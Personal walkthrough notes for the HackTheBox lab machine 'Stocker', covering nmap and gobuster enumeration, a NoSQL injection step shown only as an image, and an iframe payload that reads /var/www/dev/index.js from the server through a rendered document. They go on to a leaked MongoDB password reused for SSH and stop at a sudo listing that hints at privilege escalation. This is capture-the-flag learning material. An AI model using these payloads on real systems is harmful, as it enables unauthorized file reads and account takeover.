#HackTheBox #linux 
# 1- Enumeration

## Nmap
└─# nmap -Pn -sC -sV 10.129.228.197
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 10:22 GMT
Nmap scan report for 10.129.228.197 (10.129.228.197)
Host is up (0.45s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|http-title: Did not follow redirect to http://stocker.htb
|http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## Gobuster
┌──(root㉿kali)-[~]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://stocker.htb/ -t 50 --append-domain 
	Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]

┌──(root㉿kali)-[~]
└─# gobuster dir -w /usr/share/dirb/wordlists/common.txt -u http://dev.stocker.htb/
	/login                (Status: 200) [Size: 2667]
	/Login                (Status: 200) [Size: 2667]
	/logout               (Status: 302) [Size: 28] [--> /login]
	/static               (Status: 301) [Size: 179] [--> /static/]
	/stock                (Status: 302) [Size: 48] [--> /login?error=auth-required]

#
![[Pasted image 20230422210417.png]]



# Exploit nosql
![[Rogner - kali-linux-2023.1-virtualbox-amd64 [En fonction] - Oracle VM VirtualBox.png]]


# fin 
## _in source code of /stock_
fetch("/api/products")

fetch("/api/order", {
        method: "POST",
        body: JSON.stringify({ basket }),
        headers: {
          "Content-Type": "application/json",
        },

purchaseOrderLink.setAttribute("href", `/api/po/${response.orderId}`);

# 
![[Pasted image 20230719231720.png]]

```
<iframe src='file:///var/www/dev/index.js' height='1000' width='1000'></iframe>
```
## find
// TODO: Configure loading from dotenv for production  
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";

### pass
```
IHeardPassphrasesArePrettySecure
```

# ssh

[angoose@stocker:~$] sudo -l
```
User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

[angoose@stocker:~$] ll /usr/local/scripts/*.js
```
-rwxr-x--x 1 root root  245 Dec  6  2022 /usr/local/scripts/creds.js*
-rwxr-x--x 1 root root 1625 Dec  6  2022 /usr/local/scripts/findAllOrders.js*
-rwxr-x--x 1 root root  793 Dec  6  2022 /usr/local/scripts/findUnshippedOrders.js*
-rwxr-x--x 1 root root 1337 Dec  6  2022 /usr/local/scripts/profitThisMonth.js*
-rwxr-x--x 1 root root  623 Dec  6  2022 /usr/local/scripts/schema.js*
```

